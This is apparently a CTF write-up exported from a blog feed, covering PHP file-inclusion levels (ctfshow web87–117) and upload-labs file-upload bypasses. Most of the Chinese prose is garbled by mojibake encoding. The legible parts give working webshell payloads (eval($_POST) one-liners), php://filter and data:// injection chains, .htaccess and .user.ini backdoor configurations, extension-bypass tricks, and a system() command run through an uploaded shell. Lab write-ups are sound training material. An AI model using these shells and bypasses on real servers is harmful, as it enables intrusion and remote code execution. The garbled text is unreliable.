è®¾ç½®includeå‡½æ•°ä¸­ include_path é…ç½®é€‰é¡¹ï¼ŒæˆåŠŸæ—¶è¿”å›æ—§çš„ include_pathæˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› falseã€‚includeè¢«åŒ…å«æ–‡ä»¶å…ˆæŒ‰å‚æ•°ç»™å‡ºçš„è·¯å¾„å¯»æ‰¾ï¼Œå¦‚æœæ²¡æœ‰ç»™å‡ºç›®å½•ï¼ˆåªæœ‰æ–‡ä»¶åï¼‰æ—¶åˆ™æŒ‰ç…§ include_pathæŒ‡å®šçš„ç›®å½•å¯»æ‰¾ã€‚å¦‚æœåœ¨ include_pathä¸‹æ²¡æ‰¾åˆ°è¯¥æ–‡ä»¶åˆ™ include æœ€åæ‰åœ¨è°ƒç”¨è„šæœ¬æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å’Œå½“å‰å·¥ä½œç›®å½•ä¸‹å¯»æ‰¾ã€‚å¦‚æœæœ€åä»æœªæ‰¾åˆ°æ–‡ä»¶åˆ™ include ç»“æ„ä¼šå‘å‡ºä¸€æ¡è­¦å‘Šï¼›è¿™ä¸€ç‚¹å’Œrequire ä¸åŒï¼Œåè€…ä¼šå‘å‡ºä¸€ä¸ªè‡´å‘½é”™è¯¯ã€‚å¦‚æœå®šä¹‰äº†è·¯å¾„â€”â€”ä¸ç®¡æ˜¯ç»å¯¹è·¯å¾„ï¼ˆåœ¨ Windows ä¸‹ä»¥ç›˜ç¬¦æˆ–è€… \ å¼€å¤´ï¼Œåœ¨ Unix/Linux ä¸‹ä»¥ / å¼€å¤´ï¼‰è¿˜æ˜¯å½“å‰ç›®å½•çš„ç›¸å¯¹è·¯å¾„ï¼ˆä»¥ . æˆ–è€… .. å¼€å¤´ï¼‰â€”â€”include_pathéƒ½ä¼šè¢«å®Œå…¨å¿½ç•¥ã€‚ä¾‹å¦‚ä¸€ä¸ªæ–‡ä»¶ä»¥ ../ å¼€å¤´ï¼Œåˆ™è§£æå™¨ä¼šåœ¨å½“å‰ç›®å½•çš„çˆ¶ç›®å½•ä¸‹å¯»æ‰¾è¯¥æ–‡ä»¶ã€‚</code></pre><p>è¿˜æ˜¯web82çš„æ–¹æ³•ã€åŒæ ·çš„é“ç†ï¼šå¤šçº¿ç¨‹ç«äº‰ç†è§£</p><p>å› ä¸ºè®¾ç½®äº†ç›®å½•&#x2F;tmp&#x2F;sess_flagï¼Œæ‰€ä»¥set_include_pathå¯¹æˆ‘ä»¬çš„è„šæœ¬æ²¡æœ‰ç”¨ã€‚</p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><pre><code class="php">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file = $_GET[&#39;file&#39;];    $content = $_POST[&#39;content&#39;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;å¤§ä½¬åˆ«ç§€äº†&#39;);?&gt;&quot;.$content);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>å‚è€ƒ<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">è°ˆä¸€è°ˆphp:&#x2F;&#x2F;filterçš„å¦™ç”¨</a></p><p>â€‹<a href="https://xz.aliyun.com/t/8163#toc-3">file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜</a></p><p>æ–¹æ³•1ï¼šbase64ç¼–ç </p><p>è¿™é“é¢˜ï¼Œå‘æ–‡ä»¶è¾“å…¥å†…å®¹çš„æ—¶å€™ä¼šåœ¨å¼€å¤´å†™å…¥æ­»äº¡å‡½æ•°ï¼Œä»è€Œå¯¼è‡´ç›´æ¥ç»“æŸä»£ç çš„æ‰§è¡Œï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯ç»•è¿‡è¿™ä¸ªæ­»äº¡å‡½æ•°ã€‚</p><p>ç¼–ç æ—¶ï¼Œè½¬æ¢æˆBase64çš„æœ€å°å•ä½å°±æ˜¯3ä¸ªå­—èŠ‚</p><p>è§£ç æ—¶ï¼Œ4ä¸ªå­—èŠ‚ä¸ºä¸€ç»„ï¼›PHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šå¿½ç•¥è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼ˆBase64çš„å­—ç¬¦é€‰ç”¨äº†â€A-Zã€a-zã€0-9ã€+ã€&#x2F;â€œ 64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼‰æ‰€ä»¥ï¼Œé€šè¿‡base64è§£ç è¿‡æ»¤ä¹‹åå°±åªæœ‰ phpdie6  ä¸ªå­—ç¬¦æˆ‘ä»¬å°±è¦æ·»åŠ 2ä¸ªå­—ç¬¦è®©phpdieå’Œæˆ‘ä»¬å¢åŠ çš„ä¸¤ä¸ªå­—ç¬¦ç»„åˆèµ·æ¥è¿›è¡Œè§£ç ã€‚å³å¯æŠ¹æ‰æ­»äº¡å‡½æ•°ã€‚</p><p>å…¶æ¬¡ï¼šå› ä¸ºfilenameé‚£é‡Œéœ€è¦urldecodeï¼Œè€Œgetä¼ å‚çš„æ—¶å€™ä¼šè¿›è¡Œä¸€æ¬¡urldecodeï¼Œæ‰€ä»¥æˆ‘ä»¬çš„filenameéœ€è¦ä¸¤æ¬¡urlencodeã€‚?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.phpè¿™é‡Œéœ€è¦è¿›è¡Œurlå…¨ç¼–ç ï¼Œä¸ç„¶phpä¼šè¢«è¿‡æ»¤æ‰ã€‚<br>å°†&lt;?php eval($_POST[1]);?&gt;è¿›è¡Œbase64ç¼–ç ä¸ºï¼šPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ï¼Œæ³¨æ„å¦‚æœç›´æ¥ä¼ å…¥contentï¼Œè¿™é‡Œçš„+ä¼šè¢«å½“åšç©ºæ ¼å¤„ç†ï¼Œæ‰€ä»¥åœ¨base64è§£ç çš„æ—¶å€™å°±ä¼šå¿½ç•¥ç©ºæ ¼ï¼Œè‡ªåŠ¨åœ¨åé¢åŠ ä¸Šä¸€ä¸ª&#x3D;ï¼šå³PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8&#x3D;ï¼Œè§£ç åï¼š&lt;?php eval($_POST[1]);?   è¿™æ ·ä¼ è¿›å»å°±ä¼šæŠ¥é”™</p><p>è§£å†³æ–¹æ³•ï¼šå°†+è¿›è¡Œurlencodeæˆ–ç›´æ¥å»æ‰?&gt;</p><img src="/2023/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(ctfshow)/202243.png" class=""><p>æ–¹æ³•2ï¼šrot13ç¼–ç </p><p>æ¡ä»¶ï¼šåœ¨PHPä¸å¼€å¯short_open_tagï¼ˆçŸ­æ ‡ç­¾ï¼‰æ—¶</p><pre><code>payload:?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30//?file=php://filter/write=string.rot13/resource=3.php//å¯¹å†™çš„å†…å®¹è¿›è¡Œrot13ç¼–ç ã€‚content=&lt;?cuc riny($_CBFG[1]);?&gt;//&lt;?php eval($_POST[1]);?&gt;//rot13ä¸¤æ¬¡è§£ç åä¼šå˜æˆåŸæ¥çš„æ ·å­ã€‚æ‰€ä»¥æˆ‘ä»¬å°†ä¼ å…¥çš„contentè¿›è¡Œä¸€æ¬¡rot13ç¼–ç ï¼Œç„¶ååœ¨å†™å…¥3.phpçš„æ—¶å€™åœ¨è¿›è¡Œrot13ç¼–ç ï¼Œé‚£ä¹ˆå†™å…¥æ–‡ä»¶çš„æ—¶å€™å°±ä¼šå†™å…¥&lt;?php eval($_POST[1]);?&gt;ã€‚//è€Œ&lt;?php die(&#39;å¤§ä½¬åˆ«ç§€äº†&#39;);?&gt;åªä¼šè¿›è¡Œä¸€æ¬¡rot13ç¼–ç ï¼Œå†™å…¥æ–‡ä»¶çš„æ—¶å€™å°±ä¸æ˜¯ä¸€ä¸ªæ­£å¸¸çš„phpä»£ç æ ¼å¼ã€‚</code></pre><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>è¿™å…³è¿‡æ»¤äº†å¾ˆå¤šï¼Œä½†æœ‰ä¸ªdataæ²¡æœ‰è¿‡æ»¤</p><pre><code>data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOz8%2B //+å·å¯ä»¥ç”¨%2bç¼–ç data://text/plain;base64,&lt;?php eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>misc,çœ‹èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œå…ˆæ”¾ç€</p><h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp:&#x2F;&#x2F;filterçš„å¦™ç”¨ | ç¦»åˆ«æ­Œ</a></p><p>è¿™å…³æ²¡æœ‰è¿‡æ»¤phpï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡php:&#x2F;&#x2F;filter&#x2F;writeæ¥å†™å…¥æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ç¼–ç ç»•è¿‡æ­»äº¡å‡½æ•°ï¼Œå› ä¸ºè¿™é‡Œè¿‡æ»¤äº†base64å’Œrot13ï¼Œstringï¼Œæ‰€ä»¥å¾—ç”¨å…¶ä»–çš„ç¼–ç ã€‚</p><pre><code>convert.iconv.è¿™ä¸ªè¿‡æ»¤å™¨éœ€è¦ php æ”¯æŒ iconvï¼Œè€Œ iconv æ˜¯é»˜è®¤ç¼–è¯‘çš„ã€‚ä½¿ç”¨convert.iconv.*è¿‡æ»¤å™¨ç­‰åŒäºç”¨iconv()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®ã€‚ ç„¶è€Œ æˆ‘ä»¬å¯ä»¥ç•™æ„åˆ° iconv â€” å­—ç¬¦ä¸²æŒ‰è¦æ±‚çš„å­—ç¬¦ç¼–ç æ¥è½¬æ¢;;å…¶ç”¨æ³•ï¼šiconv ( string $in_charset , string $out_charset , string $str ) : string å°†å­—ç¬¦ä¸² str ä» in_charset è½¬æ¢ç¼–ç åˆ° out_charsetã€‚ å°±å…¶åŠŸèƒ½è€Œè®ºï¼Œæœ‰ç‚¹ç±»ä¼¼äºbase_convertçš„åŠŸæ•ˆä¸€æ ·ï¼Œåªä¸è¿‡äºŒè€…è¿˜æ˜¯æœ‰ä½œç”¨çš„åŒºåˆ«ï¼Œåªæ˜¯éƒ½æ˜¯æ¶‰åŠç¼–ç è½¬æ¢çš„é—®é¢˜è€Œå·²ï¼›é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å€Ÿç”¨æ­¤è¿‡æ»¤å™¨ï¼Œä»è€Œè¿›è¡Œç¼–ç çš„è½¬æ¢ï¼Œå†™å…¥æˆ‘ä»¬éœ€è¦çš„ä»£ç ï¼Œç„¶åè½¬æ¢æ‰æ­»äº¡ä»£ç ï¼Œå…¶å®æœ¬è´¨ä¸Šæ¥è¯´ä¹Ÿæ˜¯åˆ©ç”¨äº†ç¼–ç çš„è½¬æ¢ï¼›</code></pre><p><strong>usc-2</strong>ç¼–ç ï¼šè¿™ä¸ªæ˜¯å°†å‰åä¸¤ä¸ªå­—ç¬¦è¿›è¡Œäº¤æ›¿(abcd&#x3D;&#x3D;&gt;badc)ï¼Œæ‰€ä»¥å†™å…¥æ–‡ä»¶çš„&lt;?php die();?&gt;å°±ä¼šè¢«æ‰°ä¹±ï¼Œä»è€Œç»•è¿‡ã€‚</p><pre><code>get: ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=1.phppost:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?ç„¶åè®¿é—®1.php post:1=system(&#39;tac f*&#39;);</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ (upload-labs)</title>
      <link href="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/"/>
      <url>/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/</url>
      
        <content type="html"><![CDATA[<h3 id="Pass01Javascript-å‰ç«¯æ£€æŸ¥"><a href="#Pass01Javascript-å‰ç«¯æ£€æŸ¥" class="headerlink" title="Pass01Javascript å‰ç«¯æ£€æŸ¥"></a>Pass01Javascript å‰ç«¯æ£€æŸ¥</h3><p>å‰ç«¯jsé™åˆ¶ï¼Œä¸€èˆ¬éƒ½æ˜¯é€šè¿‡ JS é™åˆ¶ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ï¼Œå¯¹äºè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä»¥ä¸‹å‡ ç§æ–¹å¼ç»•è¿‡</p><p>1ã€ç¦ç”¨js</p><p>2ã€ä¸Šä¼ pngåç¼€çš„webshellï¼Œä»£ç†æŠ“åŒ…ï¼Œä¿®æ”¹ä¸Šä¼ çš„æ–‡ä»¶åç¼€ </p><p>â€‹è¿™é‡Œå¯èƒ½ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œburpsuiteä¼šæŠ“ä¸åˆ°åŒ…ã€‚è¿™æ—¶æˆ‘ä»¬åªéœ€æŠŠ127.0.0.1æ”¹ä¸ºæœ¬æœºIPv4çš„åœ°å€ã€‚</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/154309.png" class=""><p>3ã€ä¿®æ”¹JSæ–‡ä»¶</p><p>å³é”®â€”æŸ¥çœ‹ç½‘ç«™æºä»£ç â€”å…¨éƒ¨å¤åˆ¶â€”åˆ›å»ºä¸€ä¸ªè®°äº‹æœ¬â€”å°†ä»£ç æ”¾è¿›å»â€”æŠŠè®°äº‹æœ¬åç¼€åæ”¹ä¸º.htmlâ€”ç”¨Notepadæ‰“å¼€â€”æ‰¾åˆ°jsä»£ç â€”åˆ é™¤</p><p>å¦‚æœæˆ‘ä»¬æ‰“å¼€ï¼Œæ˜¯æœ‰ä¸Šä¼ æ–‡ä»¶çš„ç•Œé¢ï¼Œä½†æ˜¯ä¸çŸ¥é“è¦ä¸Šä¼ ç»™è°ã€‚è¿™æ—¶æˆ‘ä»¬è¿”å›åˆ°æœ€å¼€å§‹ï¼Œå³é”®â€”æ£€æŸ¥â€”ç½‘ç»œâ€”ç„¶åä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„å›¾ç‰‡ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ä¼ ç»™è°äº†ã€‚</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/155607.png" class=""><p>ç„¶åæˆ‘ä»¬åœ¨ç”¨Notepadæ‰“å¼€æˆ‘ä»¬è‡ªå·±çš„htmlæ–‡ä»¶ï¼Œä¿®æ”¹action,è¿™ä¸ªactionæ˜¯å‘Šè¯‰ä»–è¿™ä¸ªå›¾ç‰‡æäº¤ç»™è°ï¼Œå› ä¸ºè¿™ä¸ªæºä»£ç ä¸­æ²¡æœ‰ï¼Œæˆ‘ä»¬å°±è‡ªå·±åŠ ä¸€ä¸ªã€‚æœ€åç”¨æµè§ˆå™¨æ‰“å¼€æˆ‘ä»¬çš„htmlæ–‡ä»¶ï¼Œä¸Šä¼ ã€‚phpæ–‡ä»¶å³å¯ã€‚</p><h3 id="Pass02æ–‡ä»¶ç±»å‹æ£€æŸ¥æœ‰ç¼ºé™·"><a href="#Pass02æ–‡ä»¶ç±»å‹æ£€æŸ¥æœ‰ç¼ºé™·" class="headerlink" title="Pass02æ–‡ä»¶ç±»å‹æ£€æŸ¥æœ‰ç¼ºé™·"></a>Pass02æ–‡ä»¶ç±»å‹æ£€æŸ¥æœ‰ç¼ºé™·</h3><p>æ–‡ä»¶ç±»å‹æ£€æŸ¥æœ‰ç¼ºé™·ï¼ˆæ£€æŸ¥Content-Typeæ ‡å¤´æ˜¯å¦ä¸MIME ç±»å‹åŒ¹é…ï¼‰</p><p>ä¸Šä¼ phpæŠ“åŒ…ï¼Œå°†Content-Typeä¿®æ”¹ä¸ºå…è®¸ä¸Šä¼ çš„ç±»å‹ï¼ˆimage&#x2F;jpegã€image&#x2F;pngã€image&#x2F;gifï¼‰</p><img src="/2023/04/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(upload-labs)/164003.png" class=""><h3 id="Pass03é»‘åå•é™åˆ¶ä¸å®Œå…¨"><a href="#Pass03é»‘åå•é™åˆ¶ä¸å®Œå…¨" class="headerlink" title="Pass03é»‘åå•é™åˆ¶ä¸å®Œå…¨"></a>Pass03é»‘åå•é™åˆ¶ä¸å®Œå…¨</h3><p>å¯¹äºé»‘åå•é™åˆ¶ä¸Šä¼ æ–‡ä»¶åç¼€çš„ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼ç»•è¿‡</p><ol><li><p>é€šè¿‡ä½¿ç”¨å¯è¢«æ‰§è¡Œä½†ä¸å¸¸è§çš„åç¼€åï¼Œæ¯”å¦‚ php5,shtml,phps,pht,phtmlç­‰ç­‰</p></li><li><p>ä¸Šä¼ æ¶æ„çš„é…ç½®æ–‡ä»¶ï¼ˆApache .htaccessï¼‰ æ¬ºéª—æœåŠ¡å™¨å°†ä»»æ„è‡ªå®šä¹‰æ–‡ä»¶æ‰©å±•åæ˜ å°„åˆ°å¯çŸ¥æ‰§è¡Œçš„MIMEç±»å‹</p></li><li><p>åˆ©ç”¨åç«¯è§£æå·®å¼‚ç»•è¿‡é™åˆ¶</p></li><li><ol><li>æ·»åŠ å°¾éšå­—ç¬¦ï¼Œä¸€äº›ç»„ä»¶ä¼šå»é™¤æˆ–å¿½ç•¥å°¾éšç©ºæ ¼ã€ç‚¹ç­‰ï¼šexploit.php. &#x2F;exploit.php+ç©ºæ ¼</li><li>å¯¹ç‚¹ï¼Œæ–œæ  ä½¿ç”¨URL ç¼–ç ï¼Œ å¦‚æœéªŒè¯æ–‡ä»¶æ‰©å±•åæ—¶æ²¡æœ‰è§£ç ï¼Œåœ¨æœåŠ¡ç«¯è¢«è§£ç ï¼Œç»•è¿‡é»‘åå•é™åˆ¶ï¼Œ exploit%2Ephp</li><li>åœ¨æ–‡ä»¶æ‰©å±•åå‰æ·»åŠ åˆ†å·æˆ– URL ç¼–ç çš„ç©ºå­—èŠ‚å­—ç¬¦ã€‚å¦‚æœéªŒè¯æ˜¯ç”¨ PHP æˆ– Java ç­‰é«˜çº§è¯­è¨€ç¼–å†™çš„ï¼Œä½†æœåŠ¡å™¨ä½¿ç”¨ C&#x2F;C++ ä¸­çš„ä½çº§å‡½æ•°å¤„ç†æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æ–‡ä»¶åç»“å°¾å‡ºç°å·®å¼‚ï¼šexploit.asp;.jpgæˆ–exploit.asp%00.jpg</li></ol></li></ol><p>è¿™ä¸€å…³ä¸Šä¼ .php5å³å¯,å¯ä»¥ç”¨èšå‰‘è¿æ¥ï¼Œæˆ‘ç”¨çš„æ˜¯php5.4.45</p><h3 id="Pass04-htaccess-æ‰©å±•åç¼€å"><a href="#Pass04-htaccess-æ‰©å±•åç¼€å" class="headerlink" title="Pass04 .htaccess æ‰©å±•åç¼€å"></a>Pass04 .htaccess æ‰©å±•åç¼€å</h3><p>è¿™ä¸€å…³é™åˆ¶äº†å¾ˆå¤šåç¼€ï¼Œå°è¯•ä¸Šä¼  .htaccess é…ç½®æ–‡ä»¶ï¼Œå°†haha.pngå›¾ç‰‡å½“ä½œphpä»£ç è¿›è¡Œè§£æ</p><p>æ³¨æ„ï¼šåœ¨httpd.confæ–‡ä»¶ä¸­è®¾ç½® AllowOverried All ï¼Œæ‰èƒ½ä½¿ç”¨.htaccessæ–‡ä»¶</p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œé‡Œé¢å†™ä¸Šä»£ç </p><p>&lt;FilesMatch â€œhaha.pngâ€&gt;<br>SetHandler application&#x2F;x-httpd-php</p><p>&lt;&#x2F;FilesMatch&gt;</p><p>æˆ–ï¼š</p><p>&lt;FilesMatch â€œhahaâ€&gt;<br>SetHandler application&#x2F;x-httpd-php</p><p>&lt;&#x2F;FilesMatch&gt;</p><p>ç„¶åå†ä¸Šä¼ å›¾ç‰‡é©¬å³å¯</p><h3 id="Pass05"><a href="#Pass05" class="headerlink" title="Pass05"></a>Pass05</h3><p><strong>è§£æ³•ä¸€ï¼š</strong></p><p>è¿™ä¸€å…³çš„æ€è·¯æ˜¯å®ƒæ²¡æœ‰å¾ªç¯éªŒè¯ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™äº›æ”¶å°¾å»ç©ºï¼Œåˆ é™¤æœ«å°¾çš„ç‚¹ï¼Œå»é™¤å­—ç¬¦ä¸²::$DATAï¼Œè½¬æ¢ä¸ºå°å†™è¿™äº›ä¸œè¥¿åªæ˜¯éªŒè¯äº†ä¸€æ¬¡ã€‚æ‰€ä»¥æˆ‘ä»¬çš„ç»•è¿‡æ€è·¯å°±å¾ˆç®€å•ï¼Œåœ¨æ•°æ®åŒ…ä¸­æŠŠåç¼€åæ”¹ä¸º.php.  .è¯´ä¸€ä¸‹ä»–çš„éªŒè¯è¿‡ç¨‹ï¼Œé¦–å…ˆä»–å‘ç°æœ‰ä¸€ä¸ªç‚¹ï¼Œè¿™æ—¶ä¼šæŠŠä»–å»æ‰ï¼Œåˆå‘ç°æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œä¹Ÿä¼šæŠŠå®ƒå»æ‰ï¼Œæˆ‘ä»¬è¿™æ—¶è¿˜æœ‰ä¸€ä¸ªç‚¹ï¼Œä¹Ÿå°±æ˜¯.php. ç”±äºä»–åªæ˜¯éªŒè¯ä¸€æ¬¡ï¼Œæ‰€ä»¥ä¸ä¼šåœ¨å»æ‰æˆ‘ä»¬çš„ç‚¹ï¼Œè¿™æ—¶å°±å¯ä»¥ä¸Šä¼ æˆåŠŸï¼Œä¹Ÿå¯ä»¥è§£ææˆåŠŸï¼ˆç³»ç»Ÿä¼šå¿½ç•¥æœ€åä¸€ä¸ªç‚¹ï¼‰ã€‚</p><p><strong>è§£æ³•äºŒï¼š.user.ini</strong></p><p>é¦–å…ˆä¸Šä¼ .user.iniæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºï¼š<br> auto_prepend_file&#x3D;haha.png</p><p>user.iniæ–‡ä»¶é‡Œçš„æ„æ€æ˜¯ï¼šæ‰€æœ‰çš„phpæ–‡ä»¶éƒ½è‡ªåŠ¨åŒ…å«haha.pngæ–‡ä»¶ã€‚.user.iniç›¸å½“äºä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„php.ini</p><p>æ¥ç€ä¸Šä¼ Pass05.pngæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºï¼š<br> &lt;?php @eval($_POST[â€˜shellâ€™]);?&gt;</p><p>æœ€åéœ€è¦è®¿é—®çš„æ˜¯readme.php</p><p>éœ€è¦æ¡ä»¶ï¼š</p><ul><li>æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP</li><li>æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼ï¼ˆphpstudyåˆ‡æ¢ç‰ˆæœ¬ï¼Œntså°±æ˜¯fastcgiæ¨¡å¼ï¼‰</li><li>ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</li></ul><p>.user.iniå¯ä»¥å‚è€ƒï¼š<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><p><strong>è§£æ³•ä¸‰ï¼š</strong></p><p><strong>å€ŸåŠ©windowså¹³å°çš„æ­£åˆ™åŒ¹é…è§„åˆ™</strong></p><pre><code>å¦‚ä¸‹ç¬¦å·åœ¨windowså¹³å°ä¸‹ç­‰æ•ˆæœ&quot; =&gt; .&gt; =&gt; ?&lt; =&gt; *</code></pre><p>é¦–å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªxxx.php:.jpgï¼Œæ­¤æ—¶æœåŠ¡å™¨ä¼šç”Ÿæˆä¸€ä¸ªxxx.phpçš„ç©ºæ–‡ä»¶ï¼Œç„¶åï¼Œä¿®æ”¹æ•°æ®åŒ…æ–‡ä»¶åä¸ºï¼š<code>xxx.&lt;&lt;&lt;</code>ï¼Œè¿™é‡Œåœ¨move_uploaded_file($temp_file, â€˜..&#x2F;..&#x2F;upload&#x2F;xxx.&lt;&lt;&lt;â€™)ç±»ä¼¼ä¸æ­£åˆ™åŒ¹é…ï¼ŒåŒ¹é…åˆ°â€¦&#x2F;..&#x2F;upload&#x2F;xxx.phpæ–‡ä»¶ï¼Œç„¶åä¼šå°†æ­¤æ¬¡ä¸Šä¼ çš„æ–‡ä»¶æ•°æ®å†™å…¥åˆ°xxx.phpæ–‡ä»¶ä¸­ï¼Œè¿™æ ·å°±æˆåŠŸå†™å…¥æˆ‘ä»¬çš„å°é©¬äº†</p><h3 id="Pass06å¤§å°å†™ç»•è¿‡"><a href="#Pass06å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass06å¤§å°å†™ç»•è¿‡"></a>Pass06å¤§å°å†™ç»•è¿‡</h3><p>æœåŠ¡å™¨ç«¯æ£€æŸ¥åç¼€æ—¶å¿½ç•¥äº†å¯¹å¤§å°å†™çš„æ£€æµ‹ï¼Œæ•…å¯ä»¥é€šè¿‡å¤§å°å†™æ··åˆåç¼€ç»•è¿‡</p><h3 id="Pass07é»‘åå•é™åˆ¶ä¸å®Œå…¨-ç©ºæ ¼"><a href="#Pass07é»‘åå•é™åˆ¶ä¸å®Œå…¨-ç©ºæ ¼" class="headerlink" title="Pass07é»‘åå•é™åˆ¶ä¸å®Œå…¨- ç©ºæ ¼"></a>Pass07é»‘åå•é™åˆ¶ä¸å®Œå…¨- ç©ºæ ¼</h3><p>è¿™å…³æ²¡æœ‰é¦–å°¾å»ç©ºã€‚ä¸Šä¼ phpæ–‡ä»¶ï¼ŒæŠ“åŒ…åœ¨åé¢åŠ ç©ºæ ¼ã€‚</p><p>Windowsä¸‹xx.jpg[ç©ºæ ¼] æˆ–xx.jpg.è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹æ­¤å¤„ä¼šåˆ é™¤æœ«å°¾çš„ç‚¹ã€‚</p><p>åœ¨Linuxä¸Šé¢æµ‹è¯•å¤±è´¥ï¼ŒLinuxçš„æœºåˆ¶å¾ˆä¸¥æ ¼;åœ¨Windowsä¸Šé¢æµ‹è¯•æˆåŠŸï¼</p><h3 id="Pass08é»‘åå•é™åˆ¶ä¸å®Œå…¨-ç‚¹"><a href="#Pass08é»‘åå•é™åˆ¶ä¸å®Œå…¨-ç‚¹" class="headerlink" title="Pass08é»‘åå•é™åˆ¶ä¸å®Œå…¨ - ç‚¹"></a>Pass08é»‘åå•é™åˆ¶ä¸å®Œå…¨ - ç‚¹</h3><p>è¿™ä¸€å…³é»‘åå•ï¼Œæ²¡æœ‰ä½¿ç”¨deldot()è¿‡æ»¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨æ–‡ä»¶åååŠ .è¿›è¡Œç»•è¿‡</p><p>åŒæ ·Linuxæµ‹è¯•å¤±è´¥ã€‚</p><h3 id="Pass09é»‘åå•é™åˆ¶ä¸å®Œå…¨-DATA"><a href="#Pass09é»‘åå•é™åˆ¶ä¸å®Œå…¨-DATA" class="headerlink" title="Pass09é»‘åå•é™åˆ¶ä¸å®Œå…¨ - ::$DATA"></a>Pass09é»‘åå•é™åˆ¶ä¸å®Œå…¨ - ::$DATA</h3><p>è¿™ä¸€å…³é»‘åå•ï¼Œæ²¡æœ‰å¯¹::D A T A è¿› è¡Œ å¤„ ç† 